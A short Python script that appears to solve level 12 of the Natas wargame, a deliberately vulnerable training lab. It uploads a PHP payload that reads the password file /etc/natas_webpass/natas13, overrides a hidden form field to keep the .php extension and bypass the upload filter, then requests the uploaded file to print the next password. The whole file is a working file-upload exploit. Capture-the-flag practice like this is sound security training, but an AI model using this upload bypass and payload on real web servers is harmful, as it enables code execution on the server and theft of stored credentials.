import re

from natas.lib import natas_session

session, url = natas_session(12)

files = {
    "uploadedfile": (
        "payload.php",
        "<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>",
    )
}

data = {
    "MAX_FILE_SIZE": "1000",
    "filename": "payload.php",  # This is the key part, we override the hidden field to send a .php extension
}

response = session.post(f"{url}/index.php", files=files, data=data)
uploaded_path = re.findall(r"upload/\w+\.php", response.text)[0]

response = session.get(f"{url}/{uploaded_path}")
print(response.text.strip())
